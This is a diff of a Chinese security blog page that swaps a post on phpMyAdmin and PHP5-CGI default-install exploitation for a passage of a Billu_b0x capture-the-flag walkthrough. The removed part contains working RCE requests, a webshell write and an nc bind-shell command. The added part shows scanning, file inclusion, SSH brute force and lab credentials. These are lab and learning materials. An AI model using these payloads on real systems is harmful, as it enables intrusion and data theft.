@@ -70,7 +70,7 @@
 
 
 
-  <meta name="keywords" content="手工挖掘漏洞,">
+  <meta name="keywords" content="靶机实验,">
 
 
 
@@ -83,35 +83,22 @@
 
 
 
-<meta name="description" content="phpMyAdmin默认安装漏洞大家好,欢迎来到我的博客,这是我第一次使用该博客去发表文章,内心激动不已,那么让我们聊聊默认安装带来的安全问题吧. phpMyAdmin是phpMyAdmin团队开发的一套免费的、基于Web的MySQL数据库管理工具。该工具能够创建和删除数据库，创建、删除、修改数据库表，执行SQL脚本命令等。 其安装在Web服务器上的接口界面,主要用于使用php来管理安装服务器">
-<meta name="keywords" content="手工挖掘漏洞">
+<meta name="description" content="很多东西放到时间里去看就能看清楚。要么越走越远，要么越走越近。    下载地址： 链接：https://pan.baidu.com/s/1qaffdiwOFN8sI_qWJp1jlg提取码：kger复制这段内容后打开百度网盘手机App，操作更方便哦 使用VMware打开虚拟机，设置网络为仅主机模式即可 发现目标：使用nmap的-sP参数去探测在当前局域网内存活的主机 123456789101112">
+<meta name="keywords" content="靶机实验">
 <meta property="og:type" content="article">
-<meta property="og:title" content="手动挖掘之默认安装漏洞">
-<meta property="og:url" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/index.html">
+<meta property="og:title" content="CTF综合靶机（Billu_b0x）渗透测试">
+<meta property="og:url" content="https://louisnie.github.io/2019/03/03/CTF靶机/index.html">
 <meta property="og:site_name" content="Louisnie">
-<meta property="og:description" content="phpMyAdmin默认安装漏洞大家好,欢迎来到我的博客,这是我第一次使用该博客去发表文章,内心激动不已,那么让我们聊聊默认安装带来的安全问题吧. phpMyAdmin是phpMyAdmin团队开发的一套免费的、基于Web的MySQL数据库管理工具。该工具能够创建和删除数据库，创建、删除、修改数据库表，执行SQL脚本命令等。 其安装在Web服务器上的接口界面,主要用于使用php来管理安装服务器">
+<meta property="og:description" content="很多东西放到时间里去看就能看清楚。要么越走越远，要么越走越近。    下载地址： 链接：https://pan.baidu.com/s/1qaffdiwOFN8sI_qWJp1jlg提取码：kger复制这段内容后打开百度网盘手机App，操作更方便哦 使用VMware打开虚拟机，设置网络为仅主机模式即可 发现目标：使用nmap的-sP参数去探测在当前局域网内存活的主机 123456789101112">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/1.png">
-<meta property="og:image" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/2.png">
-<meta property="og:image" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/3.png">
-<meta property="og:image" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/4.png">
-<meta property="og:image" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/5.png">
-<meta property="og:image" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/6.png">
-<meta property="og:image" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/7.png">
-<meta property="og:image" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/8.png">
-<meta property="og:image" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/9.png">
-<meta property="og:image" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/10.png">
-<meta property="og:image" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/11.png">
-<meta property="og:image" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/12.png">
-<meta property="og:image" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/13.png">
-<meta property="og:image" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/14.png">
-<meta property="og:image" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/15.png">
-<meta property="og:image" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/16.png">
-<meta property="og:updated_time" content="2018-10-23T15:25:06.264Z">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/0078beR7ly1g0pqvya0xaj318h0kuhaa.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/0078beR7ly1g0prz1d94sj30mz0jfjs5.jpg">
+<meta property="og:image" content="http://ww1.sinaimg.cn/large/0078beR7ly1g0pxx2h437j30vp0fidhb.jpg">
+<meta property="og:updated_time" content="2019-03-03T15:10:22.093Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="手动挖掘之默认安装漏洞">
-<meta name="twitter:description" content="phpMyAdmin默认安装漏洞大家好,欢迎来到我的博客,这是我第一次使用该博客去发表文章,内心激动不已,那么让我们聊聊默认安装带来的安全问题吧. phpMyAdmin是phpMyAdmin团队开发的一套免费的、基于Web的MySQL数据库管理工具。该工具能够创建和删除数据库，创建、删除、修改数据库表，执行SQL脚本命令等。 其安装在Web服务器上的接口界面,主要用于使用php来管理安装服务器">
-<meta name="twitter:image" content="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/1.png">
+<meta name="twitter:title" content="CTF综合靶机（Billu_b0x）渗透测试">
+<meta name="twitter:description" content="很多东西放到时间里去看就能看清楚。要么越走越远，要么越走越近。    下载地址： 链接：https://pan.baidu.com/s/1qaffdiwOFN8sI_qWJp1jlg提取码：kger复制这段内容后打开百度网盘手机App，操作更方便哦 使用VMware打开虚拟机，设置网络为仅主机模式即可 发现目标：使用nmap的-sP参数去探测在当前局域网内存活的主机 123456789101112">
+<meta name="twitter:image" content="http://ww1.sinaimg.cn/large/0078beR7ly1g0pqvya0xaj318h0kuhaa.jpg">
 
 
 
@@ -141,13 +128,13 @@
 
 
 
-  <link rel="canonical" href="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/">
+  <link rel="canonical" href="https://louisnie.github.io/2019/03/03/CTF靶机/">
 
 
 
 
 
-  <title>手动挖掘之默认安装漏洞 | Louisnie</title>
+  <title>CTF综合靶机（Billu_b0x）渗透测试 | Louisnie</title>
   
 
 
@@ -352,7 +339,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://louisnie.github.io/2018/10/23/手动挖掘之默认安装漏洞-1/">
+    <link itemprop="mainEntityOfPage" href="https://louisnie.github.io/2019/03/03/CTF靶机/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Louisnie">
@@ -369,7 +356,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">手动挖掘之默认安装漏洞</h1>
+          <h1 class="post-title" itemprop="name headline">CTF综合靶机（Billu_b0x）渗透测试</h1>
         
 
         <div class="post-meta">
@@ -381,8 +368,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-23T23:15:28+08:00">
-                2018-10-23
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-03-03T22:22:28+08:00">
+                2019-03-03
               </time>
             
 
@@ -435,7 +422,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  1,670 字
+                  1,885 字
                 </span>
               
 
@@ -460,31 +447,54 @@
       
 
       
-        <div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=5181411&auto=0&height=66"></iframe></div>
+        <blockquote class="blockquote-center">很多东西放到时间里去看就能看清楚。要么越走越远，要么越走越近。</blockquote>
 
-<h2 id="phpMyAdmin默认安装漏洞"><a href="#phpMyAdmin默认安装漏洞" class="headerlink" title="phpMyAdmin默认安装漏洞"></a>phpMyAdmin默认安装漏洞</h2><p>大家好,欢迎来到我的博客,这是我第一次使用该博客去发表文章,内心激动不已,那么让我们聊聊默认安装带来的安全问题吧.</p>
-<p>phpMyAdmin是phpMyAdmin团队开发的一套免费的、基于Web的MySQL数据库管理工具。该工具能够创建和删除数据库，创建、删除、修改数据库表，执行SQL脚本命令等。</p>
-<p>其安装在Web服务器上的接口界面,主要用于使用php来管理安装服务器上的后台数据库(MySQL数据库),但如果采用默认安装,敏感路径未做出处理,便会存在安全漏洞,最突出的是其setup脚本中存在着服务器端请求伪造漏洞。远程攻击者可利用该漏洞执行未授权的操作。</p>
-<p>以下版本受到影响：phpMyAdmin 4.0.10.19之前的版本，4.4.15.10之前的4.4.x版本，4.6.6之前的4.6.x版本。</p>
-<p>如果目标系统采用php语言搭建的环境,那么可以尝试使用一些扫描软件或者手动爬网去试图发现是否存在phpmyadmin目录.</p>
-<p>测试环境:<br>kali:192.168.128.128/24<br>Metasploitable:192.168.128.129/24</p>
-<p>1,存在phpmyadmin界面:<br><img src="1.png" alt=""><br>如果用户未对phpmyadmin目录下的setup文件进行安全处理,那普通用户可以在不进行身份认证的情况下,便可以配置服务器信息(防范措施:不允许其他用户从公网访问phpMyAdmin目录或者禁止访问setup文件)<br><img src="2.png" alt=""></p>
-<p>我们可以通过构造参数执行配置指令,并利用php伪协议提交post内容执行</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST http://192.168.128.129/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1      </span><br><span class="line"> #问号及其后面的内容用于修改修改php的主配置文件php.ini，从而可以执行下面插入的php代码</span><br><span class="line"></span><br><span class="line">Host: 192.168.128.128 </span><br><span class="line"></span><br><span class="line">Content-Length: 35</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">passthru(&apos;id&apos;);        </span><br><span class="line"> #passthru() 函数用于调用系统命令，并把命令的运行结果原样地直接输出到标准输出设备上。</span><br><span class="line"> #也可以将id命令换成其他Linux命令去获取web系统的数据,目前使用的是普通用户www-date,权限有限</span><br><span class="line"></span><br><span class="line">die();                </span><br><span class="line"> #die() 函数输出一条消息，并退出当前脚本,此处使用为了避免获取多余无用的信息</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>可以使用Burpsuite的Repeater工具该发送post请求,获取目标的信息<img src="3.png" alt=""><br>由刚刚的id命令得知目前的用户为www-data,由查看账户信息得知其主目录为/var/www,那么便可以向其主目录写入木马,以实现远程控制的效果<br><img src="4.png" alt=""><br><img src="5.png" alt=""></p>
-<p>命令如下: </p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST http://192.168.128.129/phpMyAdmin/?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1</span><br><span class="line">Host: 192.168.128.128 </span><br><span class="line">Content-Length: 102</span><br><span class="line"></span><br><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">passthru(&apos;echo &quot;&lt;?php \$cmd = \$_GET[&quot;cmd&quot;];system(\$cmd);?&gt;&quot; &gt;/var/www/2.php&apos;);</span><br><span class="line">#该木马表示将GET方式获取的指令赋值于cmd命令,并使用system()函数运行cmd变量存储的命令</span><br><span class="line">#反斜杠作用:避免服务器将上传内容过滤,输入命令无效</span><br><span class="line">die();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>通过在浏览器访问该木马,便可获取目标系统的shell<br><img src="6.png" alt=""> </p>
-<p>使用kali中的php脚本获取反弹shell</p>
-<p>反弹shell:指的是我们在自己的机器上开启监听，然后在被攻击者的机器上发送连接请求去连接我们的机器，将被攻击者的shell反弹到我们的机器上，那么我们就可以在本地使用被攻击主机的命令并且不容易被发现</p>
-<p>kali中的PHP的反弹shell为:/usr/share/webshells/php/php-reverse-shell.php<img src="7.png" alt=""><br>然后编辑php/php-reverse-shell.php,修改ip地址为本机kali的地址,端口号选1024-65535之内任意(1-1023端口已经被系统服务占用) <img src="8.png" alt=""></p>
-<p>使用nc命令在本地(kali主机)监听本地1234端口<img src="9.png" alt=""><br>然后将php-reverse-shell.php的内容粘贴至发送的POST请求中,点击go<br><img src="10.png" alt=""><br><img src="11.png" alt=""> </p>
-<h2 id="Ubuntu-Debain默认安装PHP5-CGI漏洞"><a href="#Ubuntu-Debain默认安装PHP5-CGI漏洞" class="headerlink" title="Ubuntu/Debain默认安装PHP5-CGI漏洞"></a><strong>Ubuntu/Debain默认安装PHP5-CGI漏洞</strong></h2><p>其针对Apache/PHP远程代码执行漏洞攻击<br>该漏洞存在于使用PHP的Apache服务器，在Debian和Ubuntu的服务器上默认安装php5-cgi模块的服务器都存在此漏洞。<br>程序员可以使用CGI模块在PHP代码中调用操作系统的命令<br>如果安装了PHP5-CGI,则会在/usr/lib/cgi-bin下面生成两个二进制文件:php和php5<br><img src="12.png" alt=""><br>我们发送编码后的参数信息(编码是为了防止服务器过滤信息)去获取目标服务器的shell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST </span><br><span class="line">/cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 123</span><br><span class="line"></span><br><span class="line">Content-Length: 45</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo system(&apos;cat /etc/passwd&apos;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="13.png" alt=""><br>其实将刚刚编码的数据进行解码,可以看到其实就是PHP的参数数据<br><img src="14.png" alt=""></p>
-<p>也可以让服务器主动打开一个端口,然后在本地使用nc去连接<br>代码:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /cgi-bin/php?%2D%64+%61%6C%6C%6F%77%5F%75%72%6C%5F%69%6E%63%6C%75%64%65%3D%6F%6E+%2D%64+%73%61%66%65%5F%6D%6F%64%65%3D%6F%66%66+%2D%64+%73%75%68%6F%73%69%6E%2E%73%69%6D%75%6C%61%74%69%6F%6E%3D%6F%6E+%2D%64+%64%69%73%61%62%6C%65%5F%66%75%6E%63%74%69%6F%6E%73%3D%22%22+%2D%64+%6F%70%65%6E%5F%62%61%73%65%64%69%72%3D%6E%6F%6E%65+%2D%64+%61%75%74%6F%5F%70%72%65%70%65%6E%64%5F%66%69%6C%65%3D%70%68%70%3A%2F%2F%69%6E%70%75%74+%2D%64+%63%67%69%2E%66%6F%72%63%65%5F%72%65%64%69%72%65%63%74%3D%30+%2D%64+%63%67%69%2E%72%65%64%69%72%65%63%74%5F%73%74%61%74%75%73%5F%65%6E%76%3D%30+%2D%6E HTTP/1.1</span><br><span class="line"></span><br><span class="line">Host: 123</span><br><span class="line"></span><br><span class="line">Content-Length: 86</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo system(&apos;mkfifo /tmp/pipe;sh /tmp/pipe | nc -nlp 4444 &gt; /tmp/pipe&apos;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="15.png" alt=""><br><img src="16.png" alt=""></p>
+<div align="middle"><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=5272610&auto=1&height=66"></iframe></div>
+
+<p>下载地址：</p>
+<p>链接：<a href="https://pan.baidu.com/s/1qaffdiwOFN8sI_qWJp1jlg" target="_blank" rel="noopener">https://pan.baidu.com/s/1qaffdiwOFN8sI_qWJp1jlg</a><br>提取码：kger<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p>
+<p>使用VMware打开虚拟机，设置网络为仅主机模式即可</p>
+<h3 id="发现目标："><a href="#发现目标：" class="headerlink" title="发现目标："></a>发现目标：</h3><p>使用nmap的-sP参数去探测在当前局域网内存活的主机</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sP 192.168.149.0/24</span><br><span class="line"></span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-03 16:49 CST</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.149.1</span><br><span class="line"></span><br><span class="line">Host is up (0.00036s latency).</span><br><span class="line"></span><br><span class="line">MAC Address: 00:50:56:C0:00:01 (VMware)   </span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.149.132   //靶机地址</span><br><span class="line"></span><br><span class="line">Host is up (0.00019s latency).</span><br><span class="line"></span><br><span class="line">MAC Address: 00:0C:29:E8:DA:C7 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.149.254  //网关地址</span><br><span class="line"></span><br><span class="line">Host is up (0.00091s latency).</span><br><span class="line"></span><br><span class="line">MAC Address: 00:50:56:F5:FB:82 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap scan report for 192.168.149.131   //kali主机地址</span><br><span class="line"></span><br><span class="line">Host is up.</span><br><span class="line"></span><br><span class="line">Nmap done: 256 IP addresses (4 hosts up) scanned in 28.11 seconds</span><br></pre></td></tr></table></figure>
+<p>使用nmap的-sV扫描目标系统开放的服务，-p-表示对目标系统全部端口进行扫描，–script=banner表示使用nmap中的脚本去扫描目标系统的服务版本信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap -sV -p-  --script=banner  192.168.149.132</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2019-03-03 17:20 CST</span><br><span class="line">Nmap scan report for 192.168.149.132</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">|_banner: SSH-2.0-OpenSSH_5.9p1 Debian-5ubuntu1.4</span><br><span class="line">80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Ubuntu)</span><br><span class="line">MAC Address: 00:0C:29:E8:DA:C7 (VMware)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 38.04 seconds</span><br></pre></td></tr></table></figure>
+<p>发现目标系统只开放了22端口和80端口，那么先从80端口尝试一番</p>
+<h3 id="探测SQL注入漏洞："><a href="#探测SQL注入漏洞：" class="headerlink" title="探测SQL注入漏洞："></a>探测SQL注入漏洞：</h3><p>通过浏览器访问目标系统的80端口，出现下面的页面，需要展示SQL注入技巧，尝试了几个SQL万能密码都没办法成功，那么可以用sqlmap跑一跑，可能能跑出结果</p>
+<p><img src="http://ww1.sinaimg.cn/large/0078beR7ly1g0pqvya0xaj318h0kuhaa.jpg" alt=""></p>
+<p>因为使用burpsuite抓包的值是post类型的数据包，所以我们设置的sqlmap命令为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u &quot;http://192.168.149.132/&quot; --data=&quot;un=admin&amp;ps=123456&amp;login=let%27s+login&quot; --dbms=&quot;mysql&quot; --level=3 --batch</span><br></pre></td></tr></table></figure>
+<p>但是跑了好久也没有跑出来，只能换一种方法</p>
+<h3 id="目录爆破："><a href="#目录爆破：" class="headerlink" title="目录爆破："></a>目录爆破：</h3><p>试试目录爆破获取可以获取到有用的信息</p>
+<p>我平时在Windows下使用的是御剑，kali 中用得是dirb和dirbuster</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# dirb http://192.168.149.132</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">DIRB v2.22    </span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">START_TIME: Sun Mar  3 18:03:34 2019</span><br><span class="line">URL_BASE: http://192.168.149.132/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.149.132/ ----</span><br><span class="line">+ http://192.168.149.132/add (CODE:200|SIZE:307)                                                         </span><br><span class="line">+ http://192.168.149.132/c (CODE:200|SIZE:1)                                                             </span><br><span class="line">+ http://192.168.149.132/cgi-bin/ (CODE:403|SIZE:291)                                                    </span><br><span class="line">+ http://192.168.149.132/head (CODE:200|SIZE:2793)                                                       </span><br><span class="line">==&gt; DIRECTORY: http://192.168.149.132/images/                                                            </span><br><span class="line">+ http://192.168.149.132/in (CODE:200|SIZE:47559)                                                        </span><br><span class="line">+ http://192.168.149.132/index (CODE:200|SIZE:3267)                                                      </span><br><span class="line">+ http://192.168.149.132/index.php (CODE:200|SIZE:3267)                                                  </span><br><span class="line">+ http://192.168.149.132/panel (CODE:302|SIZE:2469)                                                      </span><br><span class="line">+ http://192.168.149.132/server-status (CODE:403|SIZE:296)                                               </span><br><span class="line">+ http://192.168.149.132/show (CODE:200|SIZE:1)                                                          </span><br><span class="line">+ http://192.168.149.132/test (CODE:200|SIZE:72)                                                         </span><br><span class="line">                                                                                                         </span><br><span class="line">---- Entering directory: http://192.168.149.132/images/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.                        </span><br><span class="line">    (Use mode &apos;-w&apos; if you want to scan it anyway)</span><br><span class="line">                                                                               </span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Sun Mar  3 18:03:38 2019</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 11</span><br></pre></td></tr></table></figure>
+<p>当访问到test文件时，系统提示：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;file&apos; parameter is empty. Please provide file path in &apos;file&apos; parameter</span><br></pre></td></tr></table></figure>
+<h3 id="文件包含："><a href="#文件包含：" class="headerlink" title="文件包含："></a>文件包含：</h3><p>那么可以得出test文件内有一个文件包含函数，那么这里很有可能有个文件包含漏洞</p>
+<p>原先构造URL为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.149.132/test?file=/etc/passwd</span><br></pre></td></tr></table></figure>
+<p>发现没有反应，那么可能需要构造post类型数据包</p>
+<p><img src="http://ww1.sinaimg.cn/large/0078beR7ly1g0prz1d94sj30mz0jfjs5.jpg" alt=""></p>
+<p>由passwd我们可以得出当时可以登录的账号为root和ica用户</p>
+<p>我们可以使用hydra进行爆破试试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l root -P /root/dict/1433-pass.txt -T 6 192.168.149.132 ssh</span><br></pre></td></tr></table></figure>
+<p>当然hydra是可以爆破成功的，只要字典强大，爆出root密码为roottoor。这个等会用。</p>
+<p>我们将刚刚爆破出来的文件一一下载看看里面有没有其他有用的内容</p>
+<p>当在查看c.php文件时，发现其存在mysql数据库的账号和密码和数据库名。我们即可以通过数据库连接软件去连接</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">#header( &apos;Z-Powered-By:its chutiyapa xD&apos; );</span><br><span class="line">header(&apos;X-Frame-Options: SAMEORIGIN&apos;);</span><br><span class="line">header( &apos;Server:testing only&apos; );</span><br><span class="line">header( &apos;X-Powered-By:testing only&apos; );</span><br><span class="line"></span><br><span class="line">ini_set( &apos;session.cookie_httponly&apos;, 1 );</span><br><span class="line"></span><br><span class="line">$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</span><br><span class="line"></span><br><span class="line">// Check connection</span><br><span class="line">if (mysqli_connect_errno())</span><br><span class="line">  &#123;</span><br><span class="line">  echo &quot;connection failed -&gt;  &quot; . mysqli_connect_error();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>获得网站账号biLLu，密码hEx_it，然后成功登陆</p>
+<p>在网站发现可以添加用户，并能上传图片，发现只能上传图片文件的后缀才可以，显然网站设置了白名单。</p>
+<h3 id="获取shell："><a href="#获取shell：" class="headerlink" title="获取shell："></a>获取shell：</h3><p>我们之前查看test文件包含的时候，下载了panel.php文件，这个文件也存在文件包含的功能</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">if(isset($_POST[&apos;continue&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">	$dir=getcwd();</span><br><span class="line">	$choice=str_replace(&apos;./&apos;,&apos;&apos;,$_POST[&apos;load&apos;]);</span><br><span class="line">	</span><br><span class="line">	if($choice===&apos;add&apos;)</span><br><span class="line">	